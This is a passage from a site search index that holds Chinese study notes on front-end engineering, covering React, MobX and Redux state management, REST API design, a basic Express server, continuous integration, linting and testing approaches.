\u7684\u4e00\u5927\u4f18\u52bf\uff0c\u5c31\u662f\u7f51\u4e0a\u6709\u5f88\u591a\u5df2\u7ecf\u5199\u597d\u7684\u7ec4\u4ef6\u5e93\uff0c\u53ef\u4ee5\u4f7f\u7528\u3002</p> <p>React-Bootstrap\uff1ahttps://react-bootstrap.github.io/</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#recharts","title":"\u793a\u4f8b\uff1aReCharts","text":"<p>ReCharts \u662f\u4e00\u4e2a React \u56fe\u8868\u7ec4\u4ef6\u5e93\u3002http://recharts.org/</p> <p>\u6d4f\u89c8\u5668\u6253\u5f00`demos/recharts-demo/index.html\uff0c\u4ed4\u7ec6\u67e5\u770b\u6e90\u7801\uff0c\u4f53\u4f1a JSX \u8bed\u6cd5\u5bf9\u8868\u8fbe\u590d\u6742\u7ec4\u4ef6\u7684\u4f18\u52bf\u3002</p> <pre><code>&lt;LineChart width={1000} height={400} data={data}&gt;\n  &lt;XAxis dataKey=\"name\"/&gt;\n  &lt;YAxis/&gt;\n  &lt;CartesianGrid stroke=\"#eee\" strokeDasharray=\"5 5\"/&gt;\n  &lt;Line type=\"monotone\" dataKey=\"uv\" stroke=\"#8884d8\" /&gt;\n  &lt;Line type=\"monotone\" dataKey=\"pv\" stroke=\"#82ca9d\" /&gt;\n&lt;/LineChart&gt;\n</code></pre>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#react_2","title":"React \u7684\u6838\u5fc3\u601d\u60f3","text":"<p>View \u662f State \u7684\u8f93\u51fa\u3002</p> <pre><code>view = f(state)\n</code></pre> <p>\u4e0a\u5f0f\u4e2d\uff0c<code>f</code>\u8868\u793a\u51fd\u6570\u5173\u7cfb\u3002\u53ea\u8981 State \u53d1\u751f\u53d8\u5316\uff0cView \u4e5f\u8981\u968f\u4e4b\u53d8\u5316\u3002</p> <p>React \u7684\u672c\u8d28\u662f\u5c06\u56fe\u5f62\u754c\u9762\uff08GUI\uff09\u51fd\u6570\u5316\u3002</p> <pre><code>const person = {\n  name: \"michael\",\n  age: 31\n}\nconst App = ({ person }) =&gt; &lt;h1&gt;{ person.name }&lt;/h1&gt;\nReactDOM.render(&lt;App person={person} /&gt;, document.body)\n</code></pre> <p>React \u6ca1\u6709\u89e3\u51b3\u7684\u95ee\u9898\uff1aReact \u672c\u8eab\u53ea\u662f\u4e00\u4e2a DOM \u7684\u62bd\u8c61\u5c42\uff0c\u4f7f\u7528\u7ec4\u4ef6\u6784\u5efa\u865a\u62df DOM\u3002\u5982\u679c\u5f00\u53d1\u5927\u5e94\u7528\uff0c\u8fd8\u9700\u8981\u89e3\u51b3\u4e24\u4e2a\u95ee\u9898\u3002\u67b6\u6784\uff1a\u5927\u578b\u5e94\u7528\u7a0b\u5e8f\u5e94\u8be5\u5982\u4f55\u7ec4\u7ec7\u4ee3\u7801\uff1f\u901a\u4fe1\uff1a\u7ec4\u4ef6\u4e4b\u95f4\u5982\u4f55\u901a\u4fe1\uff1f</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_8","title":"\u67b6\u6784\u95ee\u9898","text":"<p>React \u53ea\u662f\u89c6\u56fe\u5c42\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u53ef\u4ee5\u7528\u4e8e\u4efb\u4f55\u4e00\u79cd\u67b6\u6784\u3002</p> <ul> <li>MVC</li> <li>MVVM</li> <li>Observer</li> <li>Reactive</li> <li>...</li> </ul> <p>\u5230\u5e95\u54ea\u4e00\u79cd\u67b6\u6784\u6700\u5408\u9002 React \uff1f</p> <p>\u901a\u4fe1\u95ee\u9898\uff1a\u7ec4\u4ef6\u4f1a\u53d1\u751f\u4e09\u79cd\u901a\u4fe1\uff1a\u7236\u5411\u5b50\u7ec4\u4ef6\u53d1\u6d88\u606f props\uff1b\u5b50\u5411\u7236\u7ec4\u4ef6\u53d1\u6d88\u606f \u56de\u8c03\u51fd\u6570\uff1b\u5411\u5176\u4ed6\u7ec4\u4ef6\u53d1\u6d88\u606f \u4e8b\u4ef6\u76d1\u542c\uff1beventBus\u3002React \u53ea\u63d0\u4f9b\u4e86\u4e00\u79cd\u901a\u4fe1\u624b\u6bb5\uff1a\u4f20\u53c2\u3002\u5bf9\u4e8e\u5927\u5e94\u7528\uff0c\u5f88\u4e0d\u65b9\u4fbf\u3002</p> <p>\u72b6\u6001\u7684\u540c\u6b65\uff1a\u901a\u4fe1\u7684\u672c\u8d28\u662f\u72b6\u6001\u7684\u540c\u6b65\uff1bReact \u540c\u6b65\u72b6\u6001\u7684\u57fa\u672c\u65b9\u6cd5\uff1a\u627e\u5230\u901a\u4fe1\u53cc\u65b9\u6700\u8fd1\u7684\u5171\u540c\u7236\u7ec4\u4ef6\uff0c\u901a\u8fc7\u5b83\u7684<code>state</code>\uff0c\u4f7f\u5f97\u5b50\u7ec4\u4ef6\u7684\u72b6\u6001\u4fdd\u6301\u540c\u6b65\u3002</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#flux","title":"Flux \u67b6\u6784","text":"<p>Facebook \u63d0\u51fa Flux \u67b6\u6784\u7684\u6982\u5ff5\uff0c\u88ab\u8ba4\u4e3a\u662f React \u5e94\u7528\u7684\u6807\u51c6\u67b6\u6784\u3002Flux \u53ea\u662f\u4e00\u4e2a\u6982\u5ff5\uff0c\u670930\u591a\u79cd\u5b9e\u73b0\u3002</p> <p>\u6700\u5927\u7279\u70b9\uff1a\u6570\u636e\u5355\u5411\u6d41\u52a8\u3002\u4e0e MVVM \u7684\u6570\u636e\u53cc\u5411\u7ed1\u5b9a\uff0c\u5f62\u6210\u9c9c\u660e\u5bf9\u6bd4\u3002</p> <p>Flux \u7684\u6838\u5fc3\u601d\u60f3</p> <ul> <li>\u4e0d\u540c\u7ec4\u4ef6\u7684<code>state</code>\uff0c\u5b58\u653e\u5728\u4e00\u4e2a\u5916\u90e8\u7684\u3001\u516c\u5171\u7684 Store \u4e0a\u9762\u3002</li> <li>\u7ec4\u4ef6\u8ba2\u9605 Store \u7684\u4e0d\u540c\u90e8\u5206\u3002</li> <li>\u7ec4\u4ef6\u53d1\u9001\uff08dispatch\uff09\u52a8\u4f5c\uff08action\uff09\uff0c\u5f15\u53d1 Store \u7684\u66f4\u65b0\u3002</li> </ul>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#react_3","title":"\u4e24\u4e2a React \u67b6\u6784","text":"<p>React \u67b6\u6784\u7684\u6700\u91cd\u8981\u4f5c\u7528\uff1a\u7ba1\u7406 Store \u4e0e View \u4e4b\u95f4\u7684\u5173\u7cfb\u3002</p> <ul> <li>MobX\uff1a\u54cd\u5e94\u5f0f\uff08Reactive\uff09\u7ba1\u7406\uff0cstate \u662f\u53ef\u53d8\u5bf9\u8c61\uff0c\u9002\u5408\u4e2d\u5c0f\u578b\u9879\u76ee</li> <li>Redux\uff1a\u51fd\u6570\u5f0f\uff08Functional\uff09\u7ba1\u7406\uff0cstate \u662f\u4e0d\u53ef\u53d8\u5bf9\u8c61\uff0c\u9002\u5408\u5927\u578b\u9879\u76ee</li> </ul>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#mobx","title":"MobX \u67b6\u6784","text":"<p>MobX \u7684\u6838\u5fc3\u662f\u89c2\u5bdf\u8005\u6a21\u5f0f\u3002</p> <ul> <li>Store \u662f\u88ab\u89c2\u5bdf\u8005\uff08observable\uff09</li> <li>\u7ec4\u4ef6\u662f\u89c2\u5bdf\u8005\uff08observer\uff09</li> </ul> <p>\u4e00\u65e6<code>Store</code>\u6709\u53d8\u5316\uff0c\u4f1a\u7acb\u523b\u88ab\u7ec4\u4ef6\u89c2\u5bdf\u5230\uff0c\u4ece\u800c\u5f15\u53d1\u91cd\u65b0\u6e32\u67d3\u3002</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#mobx_1","title":"MobX \u4f8b\u5b50","text":"<pre><code>const { observable } = mobx;\nconst { observer } = mobxReact;\n\nconst person = observable({name: \"\u5f20\u4e09\", age: 31});\n\nconst App = observer(\n  ({ person }) =&gt; &lt;h1&gt;{ person.name }&lt;/h1&gt;\n);\n\nReactDOM.render(&lt;App person={person} /&gt;, document.body);\nperson.name = \"\u674e\u56db\";\n</code></pre> <p>UI \u5c42\u662f\u89c2\u5bdf\u8005\uff0cStore \u662f\u88ab\u89c2\u5bdf\u8005\u3002</p> <p>Store \u6240\u6709\u7684\u5c5e\u6027\uff0c\u5206\u6210\u4e24\u5927\u7c7b\uff1a\u76f4\u63a5\u88ab\u89c2\u5bdf\u7684\u5c5e\u6027\u548c\u81ea\u52a8\u8ba1\u7b97\u51fa\u6765\u7684\u5c5e\u6027\u3002</p> <pre><code>class Store {\n  @observable name = 'Bartek';\n  @computed get decorated() {\n    return `${this.name} is awesome!`;\n  }\n}\n</code></pre> <p>UI \u4f1a\u89c2\u5bdf\u5230 Store \u7684\u53d8\u5316\uff0c\u81ea\u52a8\u91cd\u65b0\u6e32\u67d3\u3002</p> <p>PS\uff1aUI \u5c42\u4f1a\u968f\u7740Store\u5c42\u6570\u636e\u53d8\u5316\u800c\u54cd\u5e94\u5f0f\u53d8\u5316\u3002\u5982\u679c\u7ec4\u4ef6\u5f88\u590d\u6742\uff0c\u7ef4\u62a4\u7684\u53d8\u91cf\u5f88\u591a\uff0c\u90a3\u4e48Store\u53d8\u5316\u5f88\u9891\u7e41\uff0c\u5c31\u4f1a\u9020\u6210\u5927\u91cf\u7684\u754c\u9762\u91cd\u7ed8\u548c\u6027\u80fd\u95ee\u9898\u3002</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#redux","title":"Redux \u67b6\u6784","text":""},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#redux_1","title":"Redux \u7684\u6838\u5fc3\u6982\u5ff5","text":"<ul> <li>\u6240\u6709\u7684\u72b6\u6001\u5b58\u653e\u5728<code>Store</code>\u3002\u7ec4\u4ef6\u6bcf\u6b21\u91cd\u65b0\u6e32\u67d3\uff0c\u90fd\u5fc5\u987b\u7531\u72b6\u6001\u53d8\u5316\u5f15\u8d77\u3002</li> <li>\u7528\u6237\u5728 UI \u4e0a\u53d1\u51fa<code>action</code>\u3002</li> <li><code>reducer</code>\u51fd\u6570\u63a5\u6536<code>action</code>\uff0c\u7136\u540e\u6839\u636e\u5f53\u524d\u7684<code>state</code>\uff0c\u8ba1\u7b97\u51fa\u65b0\u7684<code>state</code>\u3002</li> </ul> <p>Redux \u5c42\u4fdd\u5b58\u6240\u6709\u72b6\u6001\uff0cReact \u7ec4\u4ef6\u62ff\u5230\u72b6\u6001\u4ee5\u540e\uff0c\u6e32\u67d3\u51fa HTML \u4ee3\u7801\u3002</p> <p>\u793a\u4f8b\uff1a</p> <ul> <li>Redux \u5c06\u7ec4\u4ef6\u5206\u6210 UI \u7ec4\u4ef6\u548c\u5bb9\u5668\u7ec4\u4ef6\u4e24\u7c7b\u3002</li> <li>UI \u7ec4\u4ef6\u662f\u7eaf\u7ec4\u4ef6\uff0c\u4e0d\u5305\u542b state \u548c\u751f\u547d\u5468\u671f\u65b9\u6cd5\uff0c\u4e0d\u6d89\u53ca\u7ec4\u4ef6\u7684\u884c\u4e3a\uff0c\u53ea\u6d89\u53ca\u7ec4\u4ef6\u7684\u5916\u89c2\u3002</li> </ul> <pre><code>&lt;div className=\"index\"&gt;\n  &lt;p&gt;{this.props.text}&lt;/p&gt;\n  &lt;input\n    defaultValue={this.props.name}\n    onChange={this.props.onChange}\n  /&gt;\n&lt;/div&gt;\n</code></pre> <p>\u5bb9\u5668\u7ec4\u4ef6\u6b63\u597d\u76f8\u53cd\u3002</p> <ul> <li>\u4e0d\u6d89\u53ca\u7ec4\u4ef6\u7684\u5916\u89c2\uff0c\u53ea\u6d89\u53ca\u7ec4\u4ef6\u7684\u884c\u4e3a\u3002</li> <li>\u8d1f\u8d23\u8ba2\u9605 Store\uff0c\u5c06 Store \u7684\u6570\u636e\u5904\u7406\u4ee5\u540e\uff0c\u518d\u901a\u8fc7\u53c2\u6570\u4f20\u7ed9 UI \u7ec4\u4ef6\u3002</li> <li>\u7528\u6237\u7ed9\u51fa\u914d\u7f6e\u4ee5\u540e\uff0c\u7531 Redux \u751f\u6210\u3002</li> </ul> <pre><code>// MyComponent \u662f\u7eaf\u7684 UI \u7ec4\u4ef6\nconst App = connect(\n  mapStateToProps,\n  mapDispatchToProps\n)(MyComponent);\n</code></pre> <ul> <li>mapStateToProps: \u5b9a\u4e49 UI \u7ec4\u4ef6\u53c2\u6570\u4e0e State \u4e4b\u95f4\u7684\u6620\u5c04</li> <li>mapDispatchToProps\uff1a\u5b9a\u4e49 UI \u7ec4\u4ef6\u4e0e Action \u4e4b\u95f4\u7684\u6620\u5c04</li> </ul> <p>\u62c6\u5206 UI \u7ec4\u4ef6\u548c\u5bb9\u5668\u7ec4\u4ef6\u7684\u597d\u5904</p> <ul> <li>UI \u7ec4\u4ef6\u4e0e\u540e\u53f0\u6570\u636e\u65e0\u5173\uff0c\u53ef\u4ee5\u7531\u8bbe\u8ba1\u5e08\u8d1f\u8d23</li> <li>\u5bb9\u5668\u7ec4\u4ef6\u53ea\u8d1f\u8d23\u6570\u636e\u548c\u884c\u4e3a\uff0c\u4e00\u65e6 Store \u7684\u6570\u636e\u7ed3\u6784\u53d8\u5316\uff0c\u53ea\u8981\u8c03\u6574\u5bb9\u5668\u7ec4\u4ef6\u5373\u53ef</li> <li>\u8868\u73b0\u5c42\u548c\u529f\u80fd\u5c42\u8131\u94a9\uff0c\u6709\u5229\u4e8e\u4ee3\u7801\u91cd\u7528\uff0c\u4e5f\u6709\u5229\u4e8e\u770b\u6e05\u5e94\u7528\u7684\u6570\u636e\u7ed3\u6784\u548c\u4e1a\u52a1\u903b\u8f91</li> </ul>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#reducer","title":"Reducer \u51fd\u6570","text":"<p><code>reducer</code>\u662f\u4e00\u4e2a\u7eaf\u51fd\u6570\uff0c\u7528\u6765\u63a5\u6536<code>action</code>\uff0c\u7b97\u51fa\u65b0\u7684<code>state</code>\u3002</p> <pre><code>function reducer(state, action) {\n  switch (action.type) {\n    case 'change':\n      return {\n        name: action.payload,\n        text: '\u4f60\u597d\uff0c' + action.payload\n      };\n  }\n}\n</code></pre> <ul> <li><code>Store</code>\u7531 Redux \u63d0\u4f9b\u7684<code>createStore</code>\u65b9\u6cd5\u751f\u6210\uff0c\u8be5\u65b9\u6cd5\u63a5\u53d7<code>reducer</code>\u4f5c\u4e3a\u53c2\u6570\u3002</li> <li>\u4e3a\u4e86\u628a<code>Store</code>\u4f20\u5165\u7ec4\u4ef6\uff0c\u5fc5\u987b\u4f7f\u7528 Redux \u63d0\u4f9b\u7684<code>Provider</code>\u7ec4\u4ef6\u5728\u5e94\u7528\u7684\u6700\u5916\u9762\uff0c\u5305\u88f9\u4e00\u5c42\u3002</li> </ul> <pre><code>const store = createStore(reducer);\n\nReactDOM.render(\n  &lt;Provider store={store}&gt;\n    &lt;App /&gt;\n  &lt;/Provider&gt;,\n  document.body.appendChild(document.createElement('div'))\n);\n</code></pre>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#node_1","title":"Node \u5e94\u7528\u5f00\u53d1","text":""},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#node_2","title":"Node \u7b80\u4ecb","text":"<p>Node \u662f\u670d\u52a1\u5668\u7684 JavaScript \u8fd0\u884c\u73af\u5883\uff0c\u63d0\u4f9b API \u4e0e\u64cd\u4f5c\u7cfb\u7edf\u4e92\u52a8\u3002</p> <p>\u4e3b\u8981\u7528\u9014\uff1a</p> <ul> <li>\u5f00\u53d1\u524d\u7aef\u5e94\u7528</li> <li>\u5feb\u901f\u642d\u5efa\u670d\u52a1</li> <li>\u67b6\u8bbe\u7f51\u7ad9</li> </ul> <p>Node \u5f00\u53d1\u524d\u7aef\u811a\u672c\u7684\u597d\u5904\uff1a</p> <ol> <li>\u6a21\u5757\u673a\u5236</li> <li>\u7248\u672c\u7ba1\u7406</li> <li>\u5bf9\u5916\u53d1\u5e03</li> <li>\u6301\u7eed\u96c6\u6210\u7684\u6807\u51c6\u5f00\u53d1\u6d41\u7a0b</li> </ol> <pre><code>\"scripts\": {\n  \"buile\": \"webpack --mode production ./app.js -o ./bundle.js\",\n},\n</code></pre> <pre><code>npm run build\n</code></pre> <p>\u53ef\u4ee5\u628a\u4e00\u4e2aJS\u6587\u4ef6\u6253\u5305\u6210\u4e00\u4e2abundle\u6587\u4ef6\uff0c\u7136\u540e\u5728HTML\u4e2d\u5f15\u7528\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u6253\u5305\u540e\u7684JS\u6587\u4ef6</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#rest-api","title":"REST API","text":"<p>REST \u662f\u6d4f\u89c8\u5668\u4e0e\u670d\u52a1\u5668\u901a\u4fe1\u65b9\u5f0f\u7684\u4e00\u79cd\u8bbe\u8ba1\u98ce\u683c\u3002</p> <p>\u5b83\u7684\u5168\u79f0\u662f\u201cREpresentational State Transfer\u201d\uff0c\u4e2d\u6587\u610f\u4e3a\u201c\u8868\u73b0\u5c42\u72b6\u6001\u8f6c\u6362\u201d\u3002</p> <ul> <li>Resource\uff1a\u8d44\u6e90</li> <li>Representation\uff1a\u8868\u73b0\u5c42</li> <li>State\uff1a\u72b6\u6001</li> <li>Transfer\uff1a\u8f6c\u6362</li> </ul>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#rest_1","title":"REST \u7684\u6838\u5fc3\u6982\u5ff5","text":"<ol> <li>\u4e92\u8054\u7f51\u4e0a\u6240\u6709\u53ef\u4ee5\u8bbf\u95ee\u7684\u5185\u5bb9\uff0c\u90fd\u662f\u8d44\u6e90\u3002</li> <li>\u670d\u52a1\u5668\u4fdd\u5b58\u8d44\u6e90\uff0c\u5ba2\u6237\u7aef\u8bf7\u6c42\u8d44\u6e90\u3002</li> <li>\u540c\u4e00\u4e2a\u8d44\u6e90\uff0c\u6709\u591a\u79cd\u8868\u73b0\u5f62\u5f0f\u3002</li> <li>\u534f\u8bae\u672c\u8eab\u4e0d\u5e26\u6709\u72b6\u6001\uff0c\u901a\u4fe1\u65f6\u5ba2\u6237\u7aef\u5fc5\u987b\u901a\u8fc7\u53c2\u6570\uff0c\u8868\u793a\u8bf7\u6c42\u4e0d\u540c\u72b6\u6001\u7684\u8d44\u6e90\u3002</li> <li>\u72b6\u6001\u8f6c\u6362\u901a\u8fc7HTTP\u52a8\u8bcd\u8868\u793a\u3002</li> </ol>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#url","title":"URL \u8bbe\u8ba1","text":"<p>URL \u662f\u8d44\u6e90\u7684\u552f\u4e00\u8bc6\u522b\u7b26\u3002</p> <ul> <li>/store/1</li> <li>/store/2</li> <li>/store/1/employee/2</li> </ul>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_9","title":"\u67e5\u8be2\u5b57\u7b26\u4e32","text":"<p>\u67e5\u8be2\u5b57\u7b26\u4e32\u8868\u793a\u5bf9\u6240\u8bf7\u6c42\u8d44\u6e90\u7684\u7ea6\u675f\u6761\u4ef6\u3002</p> <ul> <li>GET /zoos/1/animals?limit=10</li> <li>GET /zoos/1/animals?limit=10&amp;offset=10</li> <li>GET /animals?zoo_id=1</li> </ul>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#http","title":"HTTP \u52a8\u8bcd","text":"\u64cd\u4f5c SQL\u65b9\u6cd5 HTTP\u52a8\u8bcd CREATE INSERT POST READ SELECT GET UPDATE UPDATE PUT/PATCH DELETE DELETE DELETE <pre><code>GET /v1/stores/1234\nPUT /v1/stores/1234\nPOST /v1/stores\nDELETE /v1/stores/1234\n</code></pre>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#express","title":"Express","text":"<p>Express \u662f\u6700\u5e38\u7528\u7684 Node \u6846\u67b6\uff0c\u7528\u6765\u642d\u5efa Web \u5e94\u7528\u3002</p> <p>\u5b9a\u4e49\u4e00\u4e2a Web \u5e94\u7528\u5b9e\u4f8b\uff0c\u5e76\u4e14\u542f\u52a8\u5b83\u3002</p> <pre><code>var express    = require('express');\nvar app        = express();\n\nvar port = process.env.PORT || 8080;\n\napp.listen(port);\nconsole.log('Magic happens on port ' + port);\n</code></pre> <p>\u5b9a\u4e49\u4e00\u4e2a\u8def\u7531</p> <pre><code>var router = express.Router();\n\nrouter.get('/', function(req, res) {\n  res.send('&lt;h1&gt;Hello World&lt;/h1&gt;');\n});\n\napp.use('/home', router);\n</code></pre> <p>\u4e2d\u95f4\u4ef6\uff1a\u5bf9 HTTP \u8bf7\u6c42\u8fdb\u884c\u52a0\u5de5\u3002</p> <pre><code>router.use(function(req, res, next) {\n  console.log('There is a requesting.');\n  next();\n});\n</code></pre>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_10","title":"\u524d\u7aef\u5de5\u7a0b\u7b80\u4ecb","text":""},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_11","title":"\u8f6f\u4ef6\u5de5\u7a0b\u6d41\u7a0b","text":""},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_12","title":"\u6301\u7eed\u96c6\u6210\u6d41\u7a0b","text":"<p>\u524d\u7aef\u5f00\u53d1\u8f6c\u79fb\u5230\u540e\u7aef\u73af\u5883\uff0c\u610f\u5473\u7740\u53ef\u4ee5\u9002\u7528\u6807\u51c6\u7684\u8f6f\u4ef6\u5de5\u7a0b\u6d41\u7a0b\u3002</p> <ol> <li>\u672c\u5730\u5f00\u53d1\uff08developing\uff09</li> <li>\u9759\u6001\u4ee3\u7801\u68c0\u67e5\uff08linting\uff09</li> <li>\u5355\u5143\u6d4b\u8bd5\uff08testing\uff09</li> <li>\u5408\u5e76\u8fdb\u5165\u4e3b\u5e72\uff08merging\uff09</li> <li>\u81ea\u52a8\u6784\u5efa\uff08building\uff09</li> <li>\u81ea\u52a8\u53d1\u5e03\uff08publishing\uff09</li> </ol>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_13","title":"\u6301\u7eed\u96c6\u6210\u7684\u6982\u5ff5","text":"<p>Continuous integration\uff08\u7b80\u79f0 CI\uff09\uff1a</p> <p>\u5f00\u53d1\u4ee3\u7801\u9891\u7e41\u5730\u5408\u5e76\u8fdb\u4e3b\u5e72\uff0c\u59cb\u7ec8\u4fdd\u6301\u53ef\u53d1\u5e03\u72b6\u6001\u7684\u8fd9\u4e2a\u8fc7\u7a0b\u3002</p> <p>\u4f18\u70b9</p> <ul> <li>\u5feb\u901f\u53d1\u73b0\u9519\u8bef</li> <li>\u9632\u6b62\u5206\u652f\u5927\u5e45\u504f\u79bb\u4e3b\u5e72</li> <li>\u8ba9\u4ea7\u54c1\u53ef\u4ee5\u5feb\u901f\u8fed\u4ee3\uff0c\u540c\u65f6\u8fd8\u80fd\u4fdd\u6301\u9ad8\u8d28\u91cf</li> </ul>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#eslint","title":"ESLint\uff1a\u9759\u6001\u4ee3\u7801\u68c0\u67e5\u5de5\u5177","text":"<ul> <li>\u53d1\u73b0\u8bed\u6cd5\u9519\u8bef</li> <li>\u53d1\u73b0\u98ce\u683c\u9519\u8bef</li> <li>\u81ea\u52a8\u7ea0\u6b63\u9519\u8bef</li> </ul> <p>\u4e3a\u4ec0\u4e48\u5199\u6d4b\u8bd5\uff1fWeb \u5e94\u7528\u8d8a\u6765\u8d8a\u590d\u6742\uff0c\u610f\u5473\u7740\u66f4\u53ef\u80fd\u51fa\u9519\u3002\u6d4b\u8bd5\u662f\u63d0\u9ad8\u4ee3\u7801\u8d28\u91cf\u3001\u964d\u4f4e\u9519\u8bef\u7684\u6700\u597d\u65b9\u6cd5\u4e4b\u4e00\u3002</p> <ul> <li>\u6d4b\u8bd5\u53ef\u4ee5\u786e\u4fdd\u5f97\u5230\u9884\u671f\u7ed3\u679c\u3002</li> <li>\u52a0\u5feb\u5f00\u53d1\u901f\u5ea6\u3002</li> <li>\u65b9\u4fbf\u7ef4\u62a4\u3002</li> <li>\u63d0\u4f9b\u7528\u6cd5\u7684\u6587\u6863\u3002</li> </ul> <p>\u5bf9\u4e8e\u957f\u671f\u7ef4\u62a4\u7684\u9879\u76ee\uff0c\u6d4b\u8bd5\u53ef\u4ee5\u51cf\u5c11\u6295\u5165\u65f6\u95f4\uff0c\u51cf\u8f7b\u7ef4\u62a4\u96be\u5ea6\u3002</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_14","title":"\u6d4b\u8bd5\u7684\u7c7b\u578b","text":"<ul> <li>\u5355\u5143\u6d4b\u8bd5\uff08unit testing\uff09</li> <li>\u529f\u80fd\u6d4b\u8bd5\uff08feature testing\uff09</li> <li>\u96c6\u6210\u6d4b\u8bd5\uff08integration testing\uff09</li> <li>\u7aef\u5bf9\u7aef\u6d4b\u8bd5 (End-to-End testing\uff09</li> </ul>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#_15","title":"\u4ee5\u6d4b\u8bd5\u4e3a\u5bfc\u5411\u7684\u5f00\u53d1\u6a21\u5f0f","text":"<ul> <li>TDD\uff1a\u6d4b\u8bd5\u9a71\u52a8\u7684\u5f00\u53d1\uff08Test-Driven Development\uff09</li> <li>BDD\uff1a\u884c\u4e3a\u9a71\u52a8\u7684\u5f00\u53d1\uff08Behavior-Driven Development\uff09</li> </ul> <p>\u5b83\u4eec\u90fd\u8981\u6c42\u5148\u5199\u6d4b\u8bd5\uff0c\u518d\u5199\u4ee3\u7801\u3002</p> <p>\u601d\u8003\u9898\uff1a\u6d4b\u8bd5\u5bfc\u5411\u7684\u5f00\u53d1\u6a21\u5f0f\u6709\u660e\u663e\u7684\u4f18\u70b9\uff0c\u4e3a\u4ec0\u4e48\u73b0\u5b9e\u751f\u6d3b\u4e2d\u91c7\u7528\u7684\u4eba\u4e0d\u591a\uff1f</p>"},{"location":"other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/#tdd-vs-bdd","title":"TDD vs. BDD","text":"<p>\u4e24\u8005\u4fa7\u91cd\u70b9\u4e0d\u4e00\u6837</p> <ul> 